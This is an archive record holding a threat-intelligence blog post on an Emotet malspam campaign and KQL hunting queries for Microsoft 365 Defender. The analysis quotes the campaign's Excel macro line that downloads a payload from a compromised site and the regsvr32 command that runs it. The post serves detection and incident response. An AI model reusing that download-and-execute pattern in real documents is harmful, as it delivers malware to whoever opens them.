{
    "id": "c197ff30-39f3-4d5c-91bb-92e4cd8739ac",
    "created_at": "2023-01-12T15:00:13.744743Z",
    "updated_at": "2025-03-27T02:06:14.810308Z",
    "deleted_at": null,
    "sha1_hash": "6f7d9a6ebc4eda0953f43d48fa2e9f52c0f21a99",
    "title": "2022-03-23 - Hunting Emotet campaigns with Kusto",
    "authors": "",
    "file_creation_date": "2022-05-28T17:29:12Z",
    "file_modification_date": "2022-05-28T17:29:12Z",
    "file_size": 598106,
    "plain_text": "# Hunting Emotet campaigns with Kusto\n\n**[blog.nviso.eu/2022/03/23/hunting-emotet-campaigns-with-kusto/](https://blog.nviso.eu/2022/03/23/hunting-emotet-campaigns-with-kusto/)**\n\n## Introduction\n\n\nMarch 23, 2022\n\n\nEmotet doesn’t need an introduction anymore – it is one of the more prolific cybercriminal\ngangs and has been around for many years. In January 2021, a disruption effort took place\n[via Europol and other law enforcement authorities to take Emotet down for good. [1] Indeed,](https://www.europol.europa.eu/media-press/newsroom/news/world%E2%80%99s-most-dangerous-malware-emotet-disrupted-through-global-action)\nthere was a significant decrease in Emotet malicious spam (malspam) and phishing\ncampaigns for the next few months after the takedown event.\n\n[In November 2021 however, Emotet had returned [2] and is once again targeting](https://www.bleepingcomputer.com/news/security/emotet-malware-is-back-and-rebuilding-its-botnet-via-trickbot/)\norganisations on a global scale across multiple sectors.\n\nStarting March 10th 2022, we detected a massive malspam campaign that delivers Emotet\n(and further payloads) via encrypted (password-protected) ZIP files. The campaign continues\nas of writing of this blog post on March 23rd, albeit it appears the campaign is lowering in\nfrequency. The campaign appears to be initiated by Emotet’s Epoch4 and (mainly) Epoch5\nbotnet nodes.\n\n\n-----\n\nIn this blog post, we will first have a look at the particular Emotet campaign, and expand on\ndetection and hunting rules using the Kusto Query Language (KQL).\n\n## Emotet Campaign\n\nThe malspam campaign itself has the following pattern:\n\n1. An organisation’s email server is abused / compromised to send the initial email\n2. The email has a spoofed display name, purporting to be legitimate\n3. The subject of the email is a reply “RE:” or forward “FW:” and contains the recipient’s\n\nemail address\n4. The body of the email contains only a few single sentences and a password to open\n\nthe attachment\n5. The attachment is an encrypted ZIP file, likely an attempt to evade detections, which in\n\nturn contains a macro-enabled Excel document (.XLSM)\n6. The Excel will in turn download the Emotet payload\n7. Finally, Emotet may download one of the next stages (e.g. CobaltStrike, SystemBC, or\n\nother malware)\n\nTwo examples of the email received can be observed in Figure 1. Note the target email\naddress in the subject.\n\nFigure 1 – Two example malspam emails\nWe have observed emails sent in multiple languages, including, but not limited to: Spanish,\nPortuguese, German, French, English and Dutch.\n\n\n-----\n\nThe malspam emails are typically sent from compromised email servers across multiple\norganisations. Some of the top sending domains (based on country code) observed is shown\nin Figure 2.\n\nFigure 2 – Top sender (compromised) email domains\nThe attachment naming scheme follow a somewhat irregular pattern: split between text and\nseemingly random numbers, again potentially to evade detection. A few examples of\nattachment names that are prepended is shown in Figure 3.\n\n\n-----\n\nFigure 3 – Example attachment names\nAfter opening the attachment with password provided (typically a 3-4 character password),\nan Excel file with the same name as the ZIP is observed. When opening the Excel file, we\nare presented with the usual banner to Enable Macros to make use of all features, as can be\nseen in Figure 4.\n\nFigure 4 – Low effort Excel dropper\nEnabling macros, via an XLM4.0 macro and hidden sheet or cell happens as follows:\n```\n=CALL(\"urlmon\", \"URLDownloadToFileA\", \"JCCB\", 0,\n\"http://<compromised_website>/0Rq5zobAZB/\", \"..\\wn.ocx\")\n\n```\n\n-----\n\nAnd will then result in regsvr32 downloading and executing an OCX file (DLL):\n```\nC:\\Windows\\SysWow64\\regsvr32.exe -s ..\\en.ocx\n\n```\nThis OCX file is in term the Emotet payload. Emotet can then, as mentioned, either leverage\none of its modules (plugins) for data exfiltration, or download the next malware stage as part\nof its attack campaign.\n\nWe will not analyse the Emotet malware itself, but rather focus on how to hunt several parts\nof the stage using the Kusto Query Language (KQL) in environments that make use of Office\n365.\n\n## Hunting with KQL\n\nGranted you are ingesting the right logs (license and setup) and have the necessary\npermissions (Security Reader will suffice), visit the Microsoft 365 Defender Advanced\n[Hunting’s page and query builder: https://security.microsoft.com/v2/advanced-hunting](https://security.microsoft.com/v2/advanced-hunting)\n\n### Query I – Hunting the initial campaign\n\nFirst, we want to track the scope and size of the initial Emotet campaign. We can build the\nfollowing query:\n```\nEmailAttachmentInfo\n| where FileType == \"zip\" and FileName endswith_cs \"zip\"\n| join kind=inner (EmailEvents | where Subject contains RecipientEmailAddress and\nDeliveryAction == \"Delivered\" and EmailDirection == \"Inbound\") on NetworkMessageId,\nSenderFromAddress, RecipientEmailAddress\n\n```\nThe query above focuses on Step 3 of this campaign: The subject of the email is a reply\n_“RE:” or forward “FW:” and contains the recipient’s email address. In this query, we filter on:_\n\n1. Any email that has a ZIP attachment;\n2. Where the subject contains the recipient’s email address;\n3. Where the email direction is inbound and the mail is delivered (so not junked or\n\nblocked).\n\nThis yields 22% of emails that have been delivered – the others have either been blocked or\njunked. However, we know that this campaign is larger and might have been more\nsuccessful.\n\nMeaning, we need to improve our query. We can now create an improved query like below,\nwhere the sender display name has an alias (or is spoofed):\n\n\n-----\n\n```\nEmailAttachmentInfo\n| where FileType == \"zip\" and FileName endswith_cs \"zip\" and SenderDisplayName\nstartswith_cs \"<\"\n| join kind=inner (EmailEvents | where EmailDirection == \"Inbound\" and DeliveryAction\n== \"Delivered\") on NetworkMessageId, SenderFromAddress, RecipientEmailAddress\n\n```\nThis query now results in 25% of emails that have been delivered, for the same timespan\n(campaign scope & size) as set before. The query can now further be finetuned to show all\nemails except the blocked ones. Even when malspam or phishing emails are Junked, the\nuser may manually go to the Junk Folder, open the email / attachment and from there get\ncompromised.\n\nThe final query:\n```\nEmailAttachmentInfo\n| where FileType == \"zip\" and FileName endswith_cs \"zip\" and SenderDisplayName\nstartswith_cs \"<\"\n| join kind=inner (EmailEvents | where EmailDirection == \"Inbound\" and DeliveryAction\n!= \"Blocked\") on NetworkMessageId, SenderFromAddress, RecipientEmailAddress\n\n```\nThis query now displays 73% of the whole Emotet malspam campaign. You can now export\nthe result, create statistics and blocking rules, notify users and improve settings or policies\nwhere required. An additional user awareness campaign can help to stress that Junked\nemails should not be opened when it can be avoided.\n\nAs an extra, if you merely want to create statistics on Delivered versus Junked versus\nBlocked, the following query will do just that:\n```\nEmailAttachmentInfo\n| where FileType == \"zip\" and FileName endswith_cs \"zip\" and SenderDisplayName\nstartswith_cs \"<\"\n| join kind=inner (EmailEvents | where EmailDirection == \"Inbound\") on\nNetworkMessageId, SenderFromAddress, RecipientEmailAddress\n| summarize Count = count() by DeliveryAction\n\n### Query II – Filtering on malspam attachment name\n\n```\nThis query is of lower fidelity than others in this blog, as it can produce a large number of\nFalse Positives (FPs), depending on your organisations’ geographical location and amount of\nemails received. Nevertheless, it can be useful to run the query and build further on it –\ncreating a baseline. The query below displays an extract of subjects from Table 1 and\naccording hunt:\n\n\n-----\n\n```\nlet attachmentname \ndynamic([\"adjunto\",\"adjuntos\",\"anhang\",\"archiv\",\"archivo\",\"attachment\",\"avis\",\"aviso\",\n titulo\",\"untitled\"]);\nEmailAttachmentInfo\n| where FileName has_any(attachmentname) and strlen(FileName) < 20 and FileType ==\n\"zip\"\n| join EmailEvents on NetworkMessageId\n| where DeliveryAction == \"Delivered\" and EmailDirection == \"Inbound\"\n\n```\nRunning this rule delivers a considerable amount of results, even when applying the string\nlength (strlen) to be less than 20 characters as we have observed in this campaign. Finetune\nthe query, we can add one more line to filter on display name as we have also created in\nQuery I:\n```\nlet attachmentname =\ndynamic([\"adjunto\",\"adjuntos\",\"anhang\",\"archiv\",\"archivo\",\"attachment\",\"avis\",\"aviso\",\n titulo\",\"untitled\"]);\nEmailAttachmentInfo\n| where FileName has_any(attachmentname) and strlen(FileName) < 20 and FileType ==\n\"zip\" and SenderDisplayName startswith_cs \"<\"\n| join EmailEvents on NetworkMessageId\n| where DeliveryAction == \"Delivered\" and EmailDirection == \"Inbound\"\n\n```\nThis now results in 20% True Positives (TP) as opposed to the original query, where we\nwould have needed to filter extensively. Note this query can be further adopted to your\nneeds, for example, you could remove the SenderDisplayName parameter again, and set\nother parameters (e.g. string length, email language, …).\n\n### Query III – Searching for regsvr32 doing bad things\n\nMost detection & hunting teams, Security Operation Center (SOC) analysts, incident\nresponders and so on will be acquainted with the term “lolbins”, also known as living off the\nland binaries. In short, any binary that is part of the native Operating System, in this case\nWindows, and which can be abused for other purposes than what it is intended for.\n\nIn this case, regsvr32 is leveraged – it is typically used by attackers to – you guessed it –\nregister and execute DLLs! The query below will leverage a simple regular expression\n(regex) to hunt for execution of regsvr32 attempting to run an OCX file, as was seen in this\nEmotet campaign.\n```\nDeviceProcessEvents\n| where FileName =~ \"regsvr32.exe\" and ProcessCommandLine matches regex\n@\"\\.\\.\\\\.+\\.ocx$\"\n\n## Conclusion\n\n```\nEmotet is still a significant threat to be reckoned with since its return near the end of last\nyear.\n\n\n-----\n\nThis blog post focused on dissecting Emotet s latest malspam campaign as well as creating\nhunting queries using KQL to hunt for and respond to any potential security incident. The\nqueries can also be converted to other formats (e.g. Splunk Query Language using\n[https://uncoder.io/ for example) to allow for broader hunting efforts or where using KQL might](https://uncoder.io/)\nnot be an option.\n\n_Thanks to my colleague Maxime Thiebaut (@0xthiebaut) for assistance in building the_\n_queries._\n\n### About the author\n\n\nBart\nParys\n\n\nBart is a manager at NVISO where he mainly focuses on Threat Intelligence,\nIncident Response and Malware Analysis. As an experienced consumer, curator\nand creator of Threat Intelligence, Bart loves to and has written many TI reports on\nmultiple levels such as strategic and operational across a wide variety of sectors\n[and geographies. Twitter:](https://twitter.com/bartblaze) [@bartblaze](https://twitter.com/bartblaze)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-23 - Hunting Emotet campaigns with Kusto.pdf"
    ],
    "report_names": [
        "2022-03-23 - Hunting Emotet campaigns with Kusto.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535613,
    "ts_updated_at": 1743041174,
    "ts_creation_date": 1653758952,
    "ts_modification_date": 1653758952,
    "files": {
        "pdf": "https://archive.orkl.eu/6f7d9a6ebc4eda0953f43d48fa2e9f52c0f21a99.pdf",
        "text": "https://archive.orkl.eu/6f7d9a6ebc4eda0953f43d48fa2e9f52c0f21a99.txt",
        "img": "https://archive.orkl.eu/6f7d9a6ebc4eda0953f43d48fa2e9f52c0f21a99.jpg"
    }
}